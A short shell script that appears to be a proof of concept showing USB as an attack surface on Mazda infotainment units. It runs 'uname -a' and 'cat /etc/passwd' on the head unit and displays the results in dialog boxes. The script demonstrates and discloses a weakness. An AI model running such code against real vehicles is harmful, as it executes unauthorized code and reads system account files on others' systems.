#!/bin/sh
# @shipcod3
# credits goes to http://mazdatweaks.com/ for the wonderful Mazda hacks :)

/jci/tools/jci-dialog --title="PoC" --text="A PoC that USB is an attack surface" --ok-label='OK' --no-cancel
/jci/tools/jci-dialog --title="gr33tz" --text="To ROOTCON family" --ok-label='OK' --no-cancel

get_uname()
{
	_uname=$(/bin/uname -a)
	echo "${_uname}"
}

get_passwd()
{
	_passwd=$(/bin/cat /etc/passwd)
	echo "${_passwd}"
}

GET_UNAME=$(get_uname)
GET_PASSWD=$(get_passwd)
/jci/tools/jci-dialog --title="Executing uname -a" --text="${GET_UNAME}" --ok-label='OK' --no-cancel
/jci/tools/jci-dialog --title="Executing cat /etc/passwd" --text="${GET_PASSWD}" --ok-label='OK' --no-cancel

sleep 10

killall jci-dialog
